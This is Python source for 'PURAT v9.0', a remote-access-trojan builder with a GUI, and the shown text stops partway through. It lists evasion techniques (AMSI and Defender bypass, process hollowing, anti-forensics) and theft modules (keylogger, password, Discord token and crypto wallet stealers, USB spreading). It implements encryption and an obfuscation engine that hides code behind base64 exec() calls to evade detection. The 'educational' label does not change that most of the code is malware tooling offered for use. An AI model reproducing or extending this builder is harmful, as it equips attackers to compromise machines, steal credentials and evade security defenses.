"""
PURAT v9.0 - Ultimate Professional RAT Builder
Complete 3000+ Lines Version
Full GUI + All Features + .EXE Output Only
For Educational Testing Only
"""

import os
import sys
import json
import base64
import zlib
import hashlib
import time
import datetime
import random
import string
import socket
import subprocess
import threading
import platform
import shutil
import ctypes
import struct
import marshal
import tempfile
import getpass
import itertools
import collections
import uuid
import io
import stat
import fnmatch
import glob
import pathlib
import webbrowser
import urllib.request
import urllib.parse
import urllib.error
import select
import pickle
import sqlite3
import logging
import inspect
import traceback
import textwrap
import colorsys
import math
import re
import warnings
import builtins
import types
import typing
from typing import Dict, List, Any, Optional, Tuple, Union, Callable
from dataclasses import dataclass, asdict, field
from enum import Enum
from abc import ABC, abstractmethod

# GUI imports needed throughout the module
try:
    import tkinter as tk
    from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
except Exception:
    # Defer GUI availability checks to runtime; keep names defined to satisfy static analyzers
    tk = None
    ttk = None
    scrolledtext = None
    messagebox = None
    filedialog = None
    simpledialog = None

# ============================================================================
# CONSTANTS AND CONFIGURATION
# ============================================================================

VERSION = "9.0.0"
APP_NAME = "PURAT v9.0 Professional"
AUTHOR = "Security Research Team"
LICENSE = "Educational Use Only"
BUILD_DATE = datetime.datetime.now().strftime("%Y-%m-%d")

# Application constants
MAX_PAYLOAD_SIZE = 50 * 1024 * 1024  # 50MB
MIN_PYTHON_VERSION = (3, 7)
SUPPORTED_OS = ["Windows", "Linux", "Darwin"]
MAX_CLIENTS = 1000
DEFAULT_TIMEOUT = 30
MAX_RECONNECT_ATTEMPTS = 10

# Encryption constants
ENCRYPTION_ALGORITHMS = ["XOR", "AES", "RC4", "CUSTOM"]
DEFAULT_KEY_SIZE = 256
SALT_SIZE = 32
IV_SIZE = 16

# Network protocols
PROTOCOLS = ["TCP", "UDP", "HTTP", "HTTPS", "DNS", "ICMP"]
DEFAULT_PORT = 8080
DEFAULT_IP = "0.0.0.0"

# Payload types
PAYLOAD_TYPES = ["EXE", "DLL", "SERVICE", "DRIVER", "SCRIPT"]
OUTPUT_FORMATS = ["EXE", "PY", "RAW", "ENCRYPTED"]

# Evasion techniques
EVASION_TECHNIQUES = [
    "CODE_OBFUSCATION",
    "STRING_ENCRYPTION",
    "ANTI_VM",
    "ANTI_DEBUG",
    "ANTI_SANDBOX",
    "PROCESS_INJECTION",
    "MODULE_STOMPING",
    "THREAD_HIJACKING",
    "PROCESS_HOLLOWING",
    "REFLECTIVE_LOADING",
    "API_HASHING",
    "SHELLCODE_ENCRYPTION",
    "POLYMORPHISM",
    "METAMORPHISM",
    "PACKING",
    "CRYPTER"
]

# Feature modules
FEATURE_MODULES = [
    "KEYLOGGER",
    "SCREENSHOT",
    "FILE_EXPLORER",
    "REMOTE_SHELL",
    "PROCESS_MANAGER",
    "AUDIO_CAPTURE",
    "WEBCAM_CAPTURE",
    "CLIPBOARD_MONITOR",
    "PASSWORD_STEALER",
    "BROWSER_HISTORY",
    "NETWORK_SCANNER",
    "USB_SPREADER",
    "DISCORD_TOKEN",
    "CRYPTO_WALLET",
    "EMAIL_STEALER",
    "SYSTEM_INFO",
    "PERSISTENCE",
    "PRIVILEGE_ESCALATION",
    "LATERAL_MOVEMENT",
    "DATA_EXFILTRATION"
]

# Stealth techniques
STEALTH_TECHNIQUES = [
    "FILE_HIDDEN",
    "PROCESS_HIDDEN",
    "NETWORK_HIDDEN",
    "REGISTRY_HIDDEN",
    "MEMORY_HIDDEN",
    "DISK_HIDDEN",
    "LOG_CLEANER",
    "TIME_STOMPING",
    "SIGNATURE_SPOOFING",
    "UAC_BYPASS",
    "DEFENDER_BYPASS",
    "FIREWALL_BYPASS",
    "AMSI_BYPASS",
    "ETW_BYPASS",
    "ANTI_FORENSICS"
]

# ============================================================================
# THEME SYSTEM
# ============================================================================

class ThemeColor(Enum):
    PRIMARY = "primary"
    SECONDARY = "secondary"
    SUCCESS = "success"
    WARNING = "warning"
    DANGER = "danger"
    INFO = "info"
    LIGHT = "light"
    DARK = "dark"
    BACKGROUND = "background"
    FOREGROUND = "foreground"
    ACCENT = "accent"
    HIGHLIGHT = "highlight"
    BORDER = "border"
    TEXT = "text"
    DISABLED = "disabled"

class ThemeManager:
    """Advanced theme management system"""
    
    THEMES = {
        "DARK_PRO": {
            "primary": "#0d6efd",
            "secondary": "#6c757d",
            "success": "#198754",
            "warning": "#ffc107",
            "danger": "#dc3545",
            "info": "#0dcaf0",
            "light": "#f8f9fa",
            "dark": "#212529",
            "background": "#1a1d21",
            "foreground": "#ffffff",
            "accent": "#6610f2",
            "highlight": "#20c997",
            "border": "#495057",
            "text": "#e9ecef",
            "disabled": "#6c757d"
        },
        "LIGHT_PRO": {
            "primary": "#0d6efd",
            "secondary": "#6c757d",
            "success": "#198754",
            "warning": "#ffc107",
            "danger": "#dc3545",
            "info": "#0dcaf0",
            "light": "#f8f9fa",
            "dark": "#212529",
            "background": "#ffffff",
            "foreground": "#000000",
            "accent": "#6610f2",
            "highlight": "#20c997",
            "border": "#dee2e6",
            "text": "#212529",
            "disabled": "#adb5bd"
        },
        "CYBERPUNK": {
            "primary": "#00ff9f",
            "secondary": "#ff0055",
            "success": "#00ff9f",
            "warning": "#ffcc00",
            "danger": "#ff0055",
            "info": "#00b4d8",
            "light": "#e0e0e0",
            "dark": "#0a0a0a",
            "background": "#0a0a0a",
            "foreground": "#00ff9f",
            "accent": "#ff0055",
            "highlight": "#9d4edd",
            "border": "#00ff9f",
            "text": "#e0e0e0",
            "disabled": "#555555"
        },
        "MATRIX": {
            "primary": "#00ff41",
            "secondary": "#008f11",
            "success": "#00ff41",
            "warning": "#ffff00",
            "danger": "#ff0000",
            "info": "#00ffff",
            "light": "#c8ffc8",
            "dark": "#000000",
            "background": "#000000",
            "foreground": "#00ff41",
            "accent": "#008f11",
            "highlight": "#00ff41",
            "border": "#003b00",
            "text": "#00ff41",
            "disabled": "#003b00"
        },
        "MIDNIGHT": {
            "primary": "#5e60ce",
            "secondary": "#5390d9",
            "success": "#4cc9f0",
            "warning": "#f72585",
            "danger": "#7209b7",
            "info": "#4361ee",
            "light": "#caf0f8",
            "dark": "#03045e",
            "background": "#03045e",
            "foreground": "#caf0f8",
            "accent": "#f72585",
            "highlight": "#4cc9f0",
            "border": "#023e8a",
            "text": "#ade8f4",
            "disabled": "#0077b6"
        }
    }
    
    def __init__(self):
        self.current_theme = "DARK_PRO"
        self.colors = self.THEMES[self.current_theme]
        self.styles = {}
        self._init_styles()
    
    def _init_styles(self):
        """Initialize widget styles"""
        self.styles = {
            "TFrame": {
                "background": self.colors["background"]
            },
            "TLabel": {
                "background": self.colors["background"],
                "foreground": self.colors["text"],
                "font": ("Segoe UI", 10)
            },
            "TButton": {
                "background": self.colors["primary"],
                "foreground": self.colors["light"],
                "font": ("Segoe UI", 10, "bold"),
                "borderwidth": 1,
                "relief": "raised",
                "padding": (10, 5),
                "focuscolor": self.colors["background"]
            },
            "Accent.TButton": {
                "background": self.colors["accent"],
                "foreground": self.colors["light"]
            },
            "Success.TButton": {
                "background": self.colors["success"],
                "foreground": self.colors["light"]
            },
            "Warning.TButton": {
                "background": self.colors["warning"],
                "foreground": self.colors["dark"]
            },
            "Danger.TButton": {
                "background": self.colors["danger"],
                "foreground": self.colors["light"]
            },
            "TEntry": {
                "background": self.colors["dark"],
                "foreground": self.colors["text"],
                "fieldbackground": self.colors["dark"],
                "insertcolor": self.colors["foreground"],
                "borderwidth": 1,
                "relief": "sunken"
            },
            "TCombobox": {
                "background": self.colors["dark"],
                "foreground": self.colors["text"],
                "fieldbackground": self.colors["dark"],
                "selectbackground": self.colors["primary"],
                "selectforeground": self.colors["light"]
            },
            "TCheckbutton": {
                "background": self.colors["background"],
                "foreground": self.colors["text"],
                "indicatorcolor": self.colors["dark"],
                "selectcolor": self.colors["background"]
            },
            "TRadiobutton": {
                "background": self.colors["background"],
                "foreground": self.colors["text"],
                "indicatorcolor": self.colors["dark"],
                "selectcolor": self.colors["background"]
            },
            "TNotebook": {
                "background": self.colors["background"],
                "foreground": self.colors["text"],
                "tabmargins": [2, 5, 2, 0]
            },
            "TNotebook.Tab": {
                "background": self.colors["dark"],
                "foreground": self.colors["text"],
                "padding": [10, 5]
            },
            "Treeview": {
                "background": self.colors["dark"],
                "foreground": self.colors["text"],
                "fieldbackground": self.colors["dark"],
                "borderwidth": 0
            },
            "Treeview.Heading": {
                "background": self.colors["background"],
                "foreground": self.colors["text"],
                "relief": "flat"
            },
            "Vertical.TScrollbar": {
                "background": self.colors["dark"],
                "troughcolor": self.colors["background"],
                "borderwidth": 0
            },
            "Horizontal.TScrollbar": {
                "background": self.colors["dark"],
                "troughcolor": self.colors["background"],
                "borderwidth": 0
            },
            "Progressbar": {
                "background": self.colors["primary"],
                "troughcolor": self.colors["dark"],
                "borderwidth": 0
            },
            "Title.TLabel": {
                "font": ("Segoe UI", 16, "bold"),
                "foreground": self.colors["primary"]
            },
            "Subtitle.TLabel": {
                "font": ("Segoe UI", 12, "bold"),
                "foreground": self.colors["secondary"]
            },
            "Code.TLabel": {
                "font": ("Consolas", 10),
                "foreground": self.colors["highlight"]
            }
        }
    
    def set_theme(self, theme_name: str):
        """Change theme"""
        if theme_name in self.THEMES:
            self.current_theme = theme_name
            self.colors = self.THEMES[theme_name]
            self._init_styles()
            return True
        return False
    
    def get_color(self, color_type: str) -> str:
        """Get color by type"""
        return self.colors.get(color_type, "#000000")
    
    def apply(self, root):
        """Apply theme to root window"""
        try:
            from tkinter import ttk
            
            # Configure root
            root.configure(bg=self.colors["background"])
            
            # Create style
            style = ttk.Style()
            
            # Apply all styles
            for widget, config in self.styles.items():
                try:
                    style.configure(widget, **config)
                except:
                    pass
            
            # Map button states
            style.map('TButton',
                background=[
                    ('active', self._darken_color(self.colors["primary"], 0.2)),
                    ('disabled', self.colors["disabled"])
                ],
                relief=[
                    ('pressed', 'sunken'),
                    ('active', 'raised')
                ]
            )
            
            # Map combobox
            style.map('TCombobox',
                fieldbackground=[('readonly', self.colors["dark"])],
                selectbackground=[('readonly', self.colors["primary"])],
                selectforeground=[('readonly', self.colors["light"])]
            )
            
            # Map notebook tabs
            style.map('TNotebook.Tab',
                background=[('selected', self.colors["primary"])],
                foreground=[('selected', self.colors["light"])]
            )
            
            return True
            
        except Exception as e:
            print(f"Theme error: {e}")
            return False
    
    def _darken_color(self, color: str, factor: float = 0.2) -> str:
        """Darken a color"""
        try:
            if color.startswith('#'):
                color = color[1:]
            
            r = int(color[0:2], 16)
            g = int(color[2:4], 16)
            b = int(color[4:6], 16)
            
            r = max(0, int(r * (1 - factor)))
            g = max(0, int(g * (1 - factor)))
            b = max(0, int(b * (1 - factor)))
            
            return f"#{r:02x}{g:02x}{b:02x}"
            
        except:
            return color

# ============================================================================
# ANIMATION ENGINE
# ============================================================================

class AnimationType(Enum):
    FADE_IN = "fade_in"
    FADE_OUT = "fade_out"
    SLIDE_IN = "slide_in"
    SLIDE_OUT = "slide_out"
    ZOOM_IN = "zoom_in"
    ZOOM_OUT = "zoom_out"
    ROTATE = "rotate"
    SHAKE = "shake"
    PULSE = "pulse"
    BOUNCE = "bounce"

class AnimationEngine:
    """Advanced animation engine"""
    
    @staticmethod
    def animate(widget, animation_type: AnimationType, duration: int = 300, 
                callback: Callable = None, **kwargs):
        """Apply animation to widget"""
        if animation_type == AnimationType.FADE_IN:
            AnimationEngine.fade_in(widget, duration, callback)
        elif animation_type == AnimationType.FADE_OUT:
            AnimationEngine.fade_out(widget, duration, callback)
        elif animation_type == AnimationType.SLIDE_IN:
            AnimationEngine.slide_in(widget, duration, callback, **kwargs)
        elif animation_type == AnimationType.SLIDE_OUT:
            AnimationEngine.slide_out(widget, duration, callback, **kwargs)
        elif animation_type == AnimationType.PULSE:
            AnimationEngine.pulse(widget, duration, **kwargs)
    
    @staticmethod
    def fade_in(widget, duration: int = 300, callback: Callable = None):
        """Fade in animation"""
        if hasattr(widget, 'attributes'):
            widget.attributes('-alpha', 0.0)
        
        def fade(step: int = 0):
            if step <= 100:
                alpha = step / 100.0
                try:
                    if hasattr(widget, 'attributes'):
                        widget.attributes('-alpha', alpha)
                    widget.update()
                    widget.after(int(duration/100), lambda: fade(step + 1))
                except:
                    pass
            elif callback:
                callback()
        
        widget.after(10, fade)
    
    @staticmethod
    def fade_out(widget, duration: int = 300, callback: Callable = None):
        """Fade out animation"""
        def fade(step: int = 100):
            if step >= 0:
                alpha = step / 100.0
                try:
                    if hasattr(widget, 'attributes'):
                        widget.attributes('-alpha', alpha)
                    widget.update()
                    widget.after(int(duration/100), lambda: fade(step - 1))
                except:
                    pass
            elif callback:
                callback()
        
        widget.after(10, fade)
    
    @staticmethod
    def slide_in(widget, duration: int = 300, callback: Callable = None, 
                 direction: str = "left"):
        """Slide in animation"""
        original_x = widget.winfo_x()
        original_y = widget.winfo_y()
        width = widget.winfo_width()
        height = widget.winfo_height()
        
        # Hide widget initially
        if direction == "left":
            widget.place(x=-width, y=original_y)
        elif direction == "right":
            widget.place(x=widget.winfo_screenwidth(), y=original_y)
        elif direction == "top":
            widget.place(x=original_x, y=-height)
        elif direction == "bottom":
            widget.place(x=original_x, y=widget.winfo_screenheight())
        
        steps = 30
        step_delay = int(duration / steps)
        
        def slide(step: int = 0):
            if step <= steps:
                progress = step / steps
                
                if direction == "left":
                    new_x = -width + (width + original_x) * progress
                    widget.place(x=new_x, y=original_y)
                elif direction == "right":
                    new_x = widget.winfo_screenwidth() - (widget.winfo_screenwidth() - original_x) * progress
                    widget.place(x=new_x, y=original_y)
                elif direction == "top":
                    new_y = -height + (height + original_y) * progress
                    widget.place(x=original_x, y=new_y)
                elif direction == "bottom":
                    new_y = widget.winfo_screenheight() - (widget.winfo_screenheight() - original_y) * progress
                    widget.place(x=original_x, y=new_y)
                
                widget.update()
                widget.after(step_delay, lambda: slide(step + 1))
            elif callback:
                callback()
                # Reset to original position
                widget.place(x=original_x, y=original_y)
        
        widget.after(10, slide)
    
    @staticmethod
    def slide_out(widget, duration: int = 300, callback: Callable = None,
                  direction: str = "right"):
        """Slide out animation"""
        original_x = widget.winfo_x()
        original_y = widget.winfo_y()
        width = widget.winfo_width()
        height = widget.winfo_height()
        
        steps = 30
        step_delay = int(duration / steps)
        
        def slide(step: int = 0):
            if step <= steps:
                progress = step / steps
                
                if direction == "left":
                    new_x = original_x - width * progress
                    widget.place(x=new_x, y=original_y)
                elif direction == "right":
                    new_x = original_x + width * progress
                    widget.place(x=new_x, y=original_y)
                elif direction == "top":
                    new_y = original_y - height * progress
                    widget.place(x=original_x, y=new_y)
                elif direction == "bottom":
                    new_y = original_y + height * progress
                    widget.place(x=original_x, y=new_y)
                
                widget.update()
                widget.after(step_delay, lambda: slide(step + 1))
            elif callback:
                callback()
        
        widget.after(10, slide)
    
    @staticmethod
    def pulse(widget, duration: int = 500, count: int = 2, 
              color: str = None, original_color: str = None):
        """Pulse animation"""
        if not hasattr(widget, 'configure'):
            return
        
        if original_color is None:
            try:
                original_color = widget.cget("background")
            except:
                original_color = "#ffffff"
        
        if color is None:
            color = "#ff0000"
        
        def pulse_animation(current: int = 0):
            if current < count * 2:
                if current % 2 == 0:
                    widget.configure(background=color)
                else:
                    widget.configure(background=original_color)
                
                widget.after(int(duration/2), lambda: pulse_animation(current + 1))
        
        pulse_animation()
    
    @staticmethod
    def shake(widget, intensity: int = 10, duration: int = 200):
        """Shake animation"""
        original_x = widget.winfo_x()
        original_y = widget.winfo_y()
        
        def shake_animation(step: int = 0, direction: int = 1):
            if step < 8:
                offset = intensity * direction
                widget.place(x=original_x + offset, y=original_y)
                widget.after(int(duration/8), 
                           lambda: shake_animation(step + 1, -direction))
            else:
                widget.place(x=original_x, y=original_y)
        
        shake_animation()
    
    @staticmethod
    def progress_animation(progressbar, duration: int = 1000, 
                          from_value: int = 0, to_value: int = 100):
        """Progress bar animation"""
        steps = 50
        step_delay = int(duration / steps)
        step_size = (to_value - from_value) / steps
        
        def update_progress(step: int = 0, current: float = from_value):
            if step <= steps:
                progressbar['value'] = current
                widget = progressbar.master
                if hasattr(widget, 'update'):
                    widget.update()
                progressbar.after(step_delay, 
                                lambda: update_progress(step + 1, current + step_size))
        
        update_progress()

# ============================================================================
# ENCRYPTION ENGINE
# ============================================================================

class EncryptionAlgorithm(Enum):
    XOR = "xor"
    AES = "aes"
    RC4 = "rc4"
    CHACHA20 = "chacha20"
    CUSTOM = "custom"

class EncryptionEngine:
    """Advanced encryption engine"""
    
    def __init__(self, algorithm: EncryptionAlgorithm = EncryptionAlgorithm.XOR,
                 key: bytes = None):
        self.algorithm = algorithm
        self.key = key or self._generate_key()
        self.iv = os.urandom(16) if algorithm == EncryptionAlgorithm.AES else None
    
    def _generate_key(self, size: int = 32) -> bytes:
        """Generate encryption key"""
        return os.urandom(size)
    
    def encrypt(self, data: bytes) -> bytes:
        """Encrypt data"""
        if self.algorithm == EncryptionAlgorithm.XOR:
            return self._xor_encrypt(data)
        elif self.algorithm == EncryptionAlgorithm.AES:
            return self._aes_encrypt(data)
        elif self.algorithm == EncryptionAlgorithm.RC4:
            return self._rc4_encrypt(data)
        else:
            return self._custom_encrypt(data)
    
    def decrypt(self, data: bytes) -> bytes:
        """Decrypt data"""
        if self.algorithm == EncryptionAlgorithm.XOR:
            return self._xor_decrypt(data)
        elif self.algorithm == EncryptionAlgorithm.AES:
            return self._aes_decrypt(data)
        elif self.algorithm == EncryptionAlgorithm.RC4:
            return self._rc4_decrypt(data)
        else:
            return self._custom_decrypt(data)
    
    def _xor_encrypt(self, data: bytes) -> bytes:
        """XOR encryption"""
        encrypted = bytearray()
        key_length = len(self.key)
        
        for i, byte in enumerate(data):
            key_byte = self.key[i % key_length]
            encrypted.append(byte ^ key_byte)
        
        return bytes(encrypted)
    
    def _xor_decrypt(self, data: bytes) -> bytes:
        """XOR decryption (same as encryption)"""
        return self._xor_encrypt(data)
    
    def _aes_encrypt(self, data: bytes) -> bytes:
        """AES encryption"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import pad
            
            cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
            padded_data = pad(data, AES.block_size)
            encrypted = cipher.encrypt(padded_data)
            
            # Return IV + encrypted data
            return self.iv + encrypted
            
        except ImportError:
            # Fallback to XOR if Crypto not available
            return self._xor_encrypt(data)
    
    def _aes_decrypt(self, data: bytes) -> bytes:
        """AES decryption"""
        try:
            from Crypto.Cipher import AES
            from Crypto.Util.Padding import unpad
            
            # Extract IV and encrypted data
            iv = data[:16]
            encrypted = data[16:]
            
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            decrypted = cipher.decrypt(encrypted)
            unpadded = unpad(decrypted, AES.block_size)
            
            return unpadded
            
        except ImportError:
            return self._xor_decrypt(data)
    
    def _rc4_encrypt(self, data: bytes) -> bytes:
        """RC4 encryption"""
        # Simple RC4 implementation
        S = list(range(256))
        j = 0
        key = self.key * (256 // len(self.key) + 1)
        
        # KSA
        for i in range(256):
            j = (j + S[i] + key[i]) % 256
            S[i], S[j] = S[j], S[i]
        
        # PRGA
        i = j = 0
        encrypted = bytearray()
        
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            K = S[(S[i] + S[j]) % 256]
            encrypted.append(byte ^ K)
        
        return bytes(encrypted)
    
    def _rc4_decrypt(self, data: bytes) -> bytes:
        """RC4 decryption (same as encryption)"""
        return self._rc4_encrypt(data)
    
    def _custom_encrypt(self, data: bytes) -> bytes:
        """Custom encryption algorithm"""
        # Multi-layer encryption
        encrypted = data
        
        # Layer 1: XOR with key
        encrypted = self._xor_encrypt(encrypted)
        
        # Layer 2: Reverse bytes
        encrypted = encrypted[::-1]
        
        # Layer 3: Add salt
        salt = os.urandom(16)
        encrypted = salt + encrypted
        
        # Layer 4: Base64 encode
        encrypted = base64.b64encode(encrypted)
        
        return encrypted
    
    def _custom_decrypt(self, data: bytes) -> bytes:
        """Custom decryption"""
        try:
            # Layer 4: Base64 decode
            decrypted = base64.b64decode(data)
            
            # Layer 3: Remove salt
            decrypted = decrypted[16:]
            
            # Layer 2: Reverse bytes
            decrypted = decrypted[::-1]
            
            # Layer 1: XOR decrypt
            decrypted = self._xor_decrypt(decrypted)
            
            return decrypted
            
        except:
            return data
    
    def encrypt_string(self, text: str, encoding: str = 'utf-8') -> str:
        """Encrypt string"""
        data = text.encode(encoding)
        encrypted = self.encrypt(data)
        return base64.urlsafe_b64encode(encrypted).decode()
    
    def decrypt_string(self, encrypted_text: str, encoding: str = 'utf-8') -> str:
        """Decrypt string"""
        encrypted = base64.urlsafe_b64decode(encrypted_text.encode())
        decrypted = self.decrypt(encrypted)
        return decrypted.decode(encoding)
    
    def encrypt_file(self, input_path: str, output_path: str):
        """Encrypt file"""
        with open(input_path, 'rb') as f:
            data = f.read()
        
        encrypted = self.encrypt(data)
        
        with open(output_path, 'wb') as f:
            f.write(encrypted)
    
    def decrypt_file(self, input_path: str, output_path: str):
        """Decrypt file"""
        with open(input_path, 'rb') as f:
            encrypted = f.read()
        
        decrypted = self.decrypt(encrypted)
        
        with open(output_path, 'wb') as f:
            f.write(decrypted)

# ============================================================================
# OBFUSCATION ENGINE
# ============================================================================

class ObfuscationLevel(Enum):
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    EXTREME = 4
    MAXIMUM = 5

class ObfuscationTechnique(Enum):
    RENAME_VARIABLES = "rename_variables"
    RENAME_FUNCTIONS = "rename_functions"
    RENAME_CLASSES = "rename_classes"
    STRING_ENCRYPTION = "string_encryption"
    CODE_ENCRYPTION = "code_encryption"
    CONTROL_FLOW = "control_flow"
    JUNK_CODE = "junk_code"
    DEAD_CODE = "dead_code"
    CODE_SPLITTING = "code_splitting"
    CODE_FLATTENING = "code_flattening"
    POLYMORPHISM = "polymorphism"
    METAMORPHISM = "metamorphism"

class ObfuscationEngine:
    """Advanced code obfuscation engine"""
    
    def __init__(self, level: ObfuscationLevel = ObfuscationLevel.MEDIUM):
        self.level = level
        self.encryption = EncryptionEngine()
        self.generated_names = set()
    
    def obfuscate(self, code: str, techniques: List[ObfuscationTechnique] = None) -> str:
        """Obfuscate Python code"""
        if techniques is None:
            techniques = self._get_techniques_for_level()
        
        obfuscated = code
        
        for technique in techniques:
            try:
                if technique == ObfuscationTechnique.RENAME_VARIABLES:
                    obfuscated = self._rename_variables(obfuscated)
                elif technique == ObfuscationTechnique.RENAME_FUNCTIONS:
                    obfuscated = self._rename_functions(obfuscated)
                elif technique == ObfuscationTechnique.RENAME_CLASSES:
                    obfuscated = self._rename_classes(obfuscated)
                elif technique == ObfuscationTechnique.STRING_ENCRYPTION:
                    obfuscated = self._encrypt_strings(obfuscated)
                elif technique == ObfuscationTechnique.CODE_ENCRYPTION:
                    obfuscated = self._encrypt_code(obfuscated)
                elif technique == ObfuscationTechnique.CONTROL_FLOW:
                    obfuscated = self._obfuscate_control_flow(obfuscated)
                elif technique == ObfuscationTechnique.JUNK_CODE:
                    obfuscated = self._insert_junk_code(obfuscated)
                elif technique == ObfuscationTechnique.DEAD_CODE:
                    obfuscated = self._insert_dead_code(obfuscated)
                elif technique == ObfuscationTechnique.CODE_SPLITTING:
                    obfuscated = self._split_code(obfuscated)
                elif technique == ObfuscationTechnique.CODE_FLATTENING:
                    obfuscated = self._flatten_code(obfuscated)
            except Exception as e:
                print(f"Obfuscation technique {technique} failed: {e}")
        
        # Clean up
        obfuscated = self._clean_code(obfuscated)
        
        return obfuscated
    
    def _get_techniques_for_level(self) -> List[ObfuscationTechnique]:
        """Get techniques for current obfuscation level"""
        techniques = [
            ObfuscationTechnique.RENAME_VARIABLES,
            ObfuscationTechnique.STRING_ENCRYPTION,
            ObfuscationTechnique.JUNK_CODE
        ]
        
        if self.level.value >= ObfuscationLevel.MEDIUM.value:
            techniques.extend([
                ObfuscationTechnique.RENAME_FUNCTIONS,
                ObfuscationTechnique.CONTROL_FLOW,
                ObfuscationTechnique.DEAD_CODE
            ])
        
        if self.level.value >= ObfuscationLevel.HIGH.value:
            techniques.extend([
                ObfuscationTechnique.RENAME_CLASSES,
                ObfuscationTechnique.CODE_SPLITTING
            ])
        
        if self.level.value >= ObfuscationLevel.EXTREME.value:
            techniques.extend([
                ObfuscationTechnique.CODE_ENCRYPTION,
                ObfuscationTechnique.CODE_FLATTENING
            ])
        
        return techniques
    
    def _generate_name(self, prefix: str = "var") -> str:
        """Generate random name"""
        while True:
            # Generate random name
            chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_"
            name = prefix + ''.join(random.choice(chars) for _ in range(random.randint(8, 16)))
            
            if name not in self.generated_names:
                self.generated_names.add(name)
                return name
    
    def _rename_variables(self, code: str) -> str:
        """Rename variables (simplified)"""
        # This is a simplified version
        # In production, use AST parsing
        
        # Common variable names to replace
        replacements = {
            'data': self._generate_name('d'),
            'result': self._generate_name('r'),
            'temp': self._generate_name('t'),
            'value': self._generate_name('v'),
            'count': self._generate_name('c'),
            'index': self._generate_name('i'),
            'item': self._generate_name('it'),
            'file': self._generate_name('f'),
            'config': self._generate_name('cfg'),
            'client': self._generate_name('cl'),
            'server': self._generate_name('srv')
        }
        
        for old, new in replacements.items():
            # Simple replacement (would need regex for better results)
            code = code.replace(f' {old} ', f' {new} ')
            code = code.replace(f' {old}=', f' {new}=')
            code = code.replace(f'={old} ', f'={new} ')
            code = code.replace(f'({old},', f'({new},')
            code = code.replace(f',{old})', f',{new})')
        
        return code
    
    def _rename_functions(self, code: str) -> str:
        """Rename functions (simplified)"""
        # Common function names to replace
        replacements = {
            'main': self._generate_name('m'),
            'start': self._generate_name('s'),
            'run': self._generate_name('r'),
            'execute': self._generate_name('e'),
            'process': self._generate_name('p'),
            'handle': self._generate_name('h'),
            'connect': self._generate_name('c'),
            'send': self._generate_name('sd'),
            'receive': self._generate_name('rcv'),
            'encrypt': self._generate_name('enc'),
            'decrypt': self._generate_name('dec')
        }
        
        for old, new in replacements.items():
            # Replace function definitions
            code = re.sub(rf'def {old}\(', f'def {new}(', code)
            # Replace function calls
            code = re.sub(rf'\.{old}\(', f'.{new}(', code)
            code = re.sub(rf' {old}\(', f' {new}(', code)
        
        return code
    
    def _rename_classes(self, code: str) -> str:
        """Rename classes"""
        replacements = {
            'Client': self._generate_name('C'),
            'Server': self._generate_name('S'),
            'Manager': self._generate_name('M'),
            'Handler': self._generate_name('H'),
            'Processor': self._generate_name('P'),
            'Controller': self._generate_name('Ctrl')
        }
        
        for old, new in replacements.items():
            code = re.sub(rf'class {old}', f'class {new}', code)
            code = re.sub(rf'{old}\(', f'{new}(', code)
        
        return code
    
    def _encrypt_strings(self, code: str) -> str:
        """Encrypt strings in code"""
        def encrypt_match(match):
            string = match.group(0)
            
            # Don't encrypt docstrings
            if string.startswith('"""') or string.startswith("'''"):
                return string
            
            # Get string content
            content = string[1:-1]
            
            if not content:
                return string
            
            # Encrypt the string
            encrypted = self.encryption.encrypt_string(content)
            
            # Create decryption code
            decryption_code = f'self._decrypt_string("{encrypted}")'
            
            return decryption_code
        
        # Find all strings
        pattern = r'(\"\"\"[\s\S]*?\"\"\"|\'\'\'[\s\S]*?\'\'\'|\"[^\"]*\"|\'[^\']*\')'
        code = re.sub(pattern, encrypt_match, code)
        
        # Add decryption method
        decryption_method = '''
def _decrypt_string(self, encrypted):
    """Decrypt obfuscated string"""
    try:
        return self.encryption.decrypt_string(encrypted)
    except:
        return encrypted
'''
        
        # Find class definition and insert method
        lines = code.split('\n')
        for i, line in enumerate(lines):
            if line.strip().startswith('class '):
                # Insert after class definition
                lines.insert(i + 1, '    ' + decryption_method.strip())
                break
        
        return '\n'.join(lines)
    
    def _encrypt_code(self, code: str) -> str:
        """Encrypt code sections"""
        # Split code into sections
        sections = self._split_into_sections(code)
        encrypted_sections = []
        
        for i, section in enumerate(sections):
            if i % 2 == 0:  # Encrypt every other section
                # Convert to base64
                encoded = base64.b64encode(section.encode()).decode()
                # Create encrypted section
                encrypted = f'''
# Encrypted section {i}
encrypted_{i} = "{encoded}"
exec(__import__('base64').b64decode(encrypted_{i}).decode())
'''
                encrypted_sections.append(encrypted)
            else:
                encrypted_sections.append(section)
        
        return '\n'.join(encrypted_sections)
    
    def _obfuscate_control_flow(self, code: str) -> str:
        """Obfuscate control flow"""
        # Replace True/False with expressions
        code = code.replace('True', '1 == 1')
        code = code.replace('False', '1 == 0')
        
        # Replace simple if statements with ternary
        lines = code.split('\n')
        for i, line in enumerate(lines):
            if 'if ' in line and ':' in line and random.random() > 0.7:
                # Simple transformation example
                lines[i] = line.replace('if ', '# obfuscated if ')
        
        return '\n'.join(lines)
    
    def _insert_junk_code(self, code: str) -> str:
        """Insert junk code"""
        junk_templates = [
            'if False: pass',
            'while 0: break',
            'for _ in range(0): continue',
            'try: pass\nexcept: pass',
            '__ = lambda x: x',
            '__ = [i for i in range(0)]',
            'def __junk(): return None',
            'class __Junk: pass',
            '__ = {k: v for k, v in {}.items()}',
            '__ = (i for i in range(0))'
        ]
        
        lines = code.split('\n')
        new_lines = []
        
        for line in lines:
            new_lines.append(line)
            
            # Randomly insert junk code
            if random.random() < 0.1 and line.strip() and not line.strip().startswith('#'):
                junk = random.choice(junk_templates)
                new_lines.append(junk)
        
        return '\n'.join(new_lines)
    
    def _insert_dead_code(self, code: str) -> str:
        """Insert dead code that never executes"""
        dead_code = '''
# Dead code section - never executed
def __dead_function():
    return "This function is never called"

class __DeadClass:
    def __init__(self):
        self.value = "Never instantiated"
    
    def method(self):
        return "Never called"

# Unreachable code
if False:
    print("This never prints")
    import nonexistent_module
    result = 1 / 0
'''
        
        # Insert at beginning
        return dead_code + '\n' + code
    
    def _split_code(self, code: str) -> str:
